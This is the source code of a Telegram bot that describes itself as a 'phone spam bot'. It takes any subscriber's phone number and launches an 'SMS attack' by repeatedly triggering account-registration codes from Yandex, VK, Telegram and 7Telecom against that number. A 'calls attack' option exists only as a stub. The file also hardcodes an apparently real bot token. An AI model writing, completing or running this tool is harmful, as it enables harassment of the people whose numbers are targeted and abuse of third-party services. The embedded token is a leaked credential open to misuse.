from aiogram import Bot, executor, Dispatcher, types
import asyncio
import time
import random
import phonenumbers

from parsers.yandex import yandex_reg
from parsers.vk import vk_reg
from parsers.telegram import telegram_reg
from parsers.seventelecom import seventelecom_reg


bot = Bot(token="6355208086:AAGPkTTQfmO8CtW9vAOJ-CayYKXiE9oW6iQ")
dp = Dispatcher(bot=bot)
current_time = 0

# bot launch handler
@dp.message_handler(commands=["start"])
async def start_command(message: types.Message) -> None:
    await message.answer(text="""
<b>welcome to the phone spam bot!</b> 🖐️

With this bot, you can carry out attacks on the phone number of any subscriber. It could be:

✉️   <em>SMS alert attack;</em>
📞   <em>Attack with constant calls.</em>

  In order to launch an attack, simply send the subscriber's phone number and select the type of attack!
""", parse_mode='HTML')

# handler with all commands
@dp.message_handler(commands=["help"])
async def help_command(message: types.Message) -> None:
    await message.answer(text="""
<b>/start</b> - <em>start the bot</em>
<b>/help</b> - <em>list of commands</em>
<b>/phoneattack</b> - <em>SMS/calls spam</em>
""", parse_mode='HTML')
    await message.delete()

processed_number = None
last_processed_time = 0

@dp.message_handler()
async def handle_message(message: types.Message):
    global processed_number, last_processed_time  # Объявляем, что мы используем глобальные переменные

    chat_id = message.chat.id
    text = message.text

    # Проверяем, является ли текст номером телефона
    is_phone_number, parsed_number = is_valid_phone_number(text)

    if is_phone_number:
        current_time = time.time()
        print(current_time)

        if processed_number is not None:
            # Проверяем, прошло ли 40 минут с момента обработки номера
            if current_time - last_processed_time < 2400:
                # Если не прошло 40 минут, отправляем сообщение о том, что повторная обработка будет доступна через 40 минут
                remaining_time = int(2400 - (current_time - last_processed_time))
                await bot.send_message(chat_id, f"This feature is currently not available. Please wait {remaining_time} seconds.")
                return

        # Если прошло 40 минут или номер еще не обрабатывался, обрабатываем номер
        processed_number = parsed_number
        last_processed_time = current_time

        # Обработка номера телефона
        keyboard = types.InlineKeyboardMarkup()
        sms_button = types.InlineKeyboardButton("SMS", callback_data="sms")
        calls_button = types.InlineKeyboardButton("Calls", callback_data="calls")
        keyboard.row(sms_button, calls_button)

        await bot.send_message(chat_id, "The phone number has been processed. Select the type of attack you want to play on the target.", reply_markup=keyboard)

        # Устанавливаем таймаут на 40 минут
        await asyncio.sleep(2400)

        # Сбрасываем глобальные переменные после истечения таймаута
        processed_number = None
        last_processed_time = 0

        # Отправляем сообщение о возобновлении функции
        await bot.send_message(chat_id, "The attack function is available again!")
    else:
        # Если введен некорректный номер телефона
        await bot.send_message(chat_id, "You have entered incorrect data. Please enter a valid phone number.")

@dp.callback_query_handler(lambda c: c.data == 'sms')
async def handle_sms_callback(callback_query: types.CallbackQuery):
    await bot.send_message(callback_query.message.chat.id, "SMS attack has begun! wait 40 minutes for the attack to complete.")
    await bot.edit_message_reply_markup(callback_query.message.chat.id, callback_query.message.message_id, reply_markup=None)
    print(f"{processed_number.country_code}{processed_number.national_number}")
    count_iteration = random.uniform(5, 7)
    while count_iteration > 0:
        yandex_reg(f"{processed_number.country_code}{processed_number.national_number}")
        time.sleep(3)

        vk_reg(f"{processed_number.country_code}{processed_number.national_number}")
        time.sleep(3)

        telegram_reg(f"{processed_number.country_code}{processed_number.national_number}")
        time.sleep(3)

        seventelecom_reg(f"{processed_number.national_number}")
        time.sleep(random.uniform(30, 46))

        print(count_iteration)
        count_iteration -= 1
        print(count_iteration)


@dp.callback_query_handler(lambda c: c.data == 'calls')
async def handle_calls_callback(callback_query: types.CallbackQuery):
    await bot.send_message(callback_query.message.chat.id, "Calls attack has begun! wait 40 minutes for the attack to complete.")
    await bot.edit_message_reply_markup(callback_query.message.chat.id, callback_query.message.message_id, reply_markup=None)


def is_valid_phone_number(text):
    try:
        # Parse the entered phone number
        parsed_number = phonenumbers.parse(text, None)

        # Checking if the number is valid
        if not phonenumbers.is_valid_number(parsed_number):
            return False, None

        # Checking for a country code
        if not parsed_number.country_code:
            return False, None

        return True, parsed_number
    except phonenumbers.phonenumberutil.NumberParseException:
        return False, None


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)